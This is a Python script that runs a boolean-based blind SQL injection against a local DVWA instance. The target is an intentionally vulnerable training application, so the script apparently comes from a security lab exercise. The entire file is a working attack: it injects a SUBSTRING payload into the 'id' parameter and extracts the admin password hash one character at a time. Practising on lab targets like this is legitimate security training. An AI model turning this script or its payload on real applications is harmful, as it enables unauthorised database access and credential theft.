import requests
import string

url = 'http://localhost/DVWA/vulnerabilities/sqli_blind/'
cookies = {
    'security': 'low',
    'PHPSESSID': 'fb2fba7592d79f033bb5e04c687fca30'
}

SUCCESS_TEXT = "User ID exists in the database."

charset = string.ascii_lowercase + string.digits
received_hash = ""

print("Starting blind SQL injection attack (brute-force admin password)...")

for i in range(1, 33):
    for char in charset:        
        payload = f"1' AND SUBSTRING((SELECT password FROM users WHERE user = 'admin'), {i}, 1) = '{char}' #"

        params = {
            'id': payload,
            'Submit': 'Submit'
        }

        try:
            response = requests.get(url, params=params, cookies=cookies)

            if SUCCESS_TEXT in response.text:
                received_hash += char
                print(f"received_hash: {received_hash}")
                break

        except requests.exceptions.RequestException as e:
            print(f"\n[!] An error occurred: {e}")

print(f"\n\nFull Hash: {received_hash}")